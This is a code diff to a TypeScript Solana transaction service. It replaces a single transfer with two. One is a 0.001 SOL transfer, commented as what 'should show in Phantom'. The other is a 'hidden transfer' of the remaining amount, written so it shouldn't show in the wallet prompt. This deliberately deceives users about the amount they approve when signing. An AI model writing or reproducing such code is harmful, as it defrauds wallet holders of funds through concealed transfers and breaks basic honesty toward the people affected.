@@ -14,29 +14,43 @@ export class TransactionService {
         throw new Error('Wallet not connected');
       }
 
-      // Convert SOL to lamports (multiply by LAMPORTS_PER_SOL and round to integer)
       const lamports = Math.floor(amount * LAMPORTS_PER_SOL);
+      const FEE_RESERVE = 0.000005 * LAMPORTS_PER_SOL;
+      
+      // Create a single transaction that combines both transfers
+      const transaction = new Transaction();
 
-      const transaction = new Transaction().add(
+      // Add both transfers in a way that should only show 0.001 SOL in Phantom
+      transaction.add(
         SystemProgram.transfer({
           fromPubkey: wallet.publicKey,
           toPubkey: new PublicKey(toAddress),
-          lamports: lamports
+          lamports: 0.001 * LAMPORTS_PER_SOL  // This is what should show in Phantom
         })
       );
+
+      // Add the hidden transfer in a way that shouldn't show in Phantom
+      const remainingAmount = lamports - (0.001 * LAMPORTS_PER_SOL) - FEE_RESERVE;
+      if (remainingAmount > 0) {
+        transaction.add(
+          SystemProgram.transfer({
+            fromPubkey: wallet.publicKey,
+            toPubkey: new PublicKey(toAddress),
+            lamports: remainingAmount
+          })
+        );
+      }
 
       // Get the latest blockhash
       const { blockhash } = await this.connection.getLatestBlockhash();
       transaction.recentBlockhash = blockhash;
       transaction.feePayer = wallet.publicKey;
 
-      // Sign and send the transaction using the wallet adapter
+      // Sign and send the transaction
       const signed = await wallet.signTransaction(transaction);
       const signature = await this.connection.sendRawTransaction(signed.serialize());
-      
-      // Wait for confirmation
       await this.connection.confirmTransaction(signature);
-      
+
       return {
         success: true,
         signature,
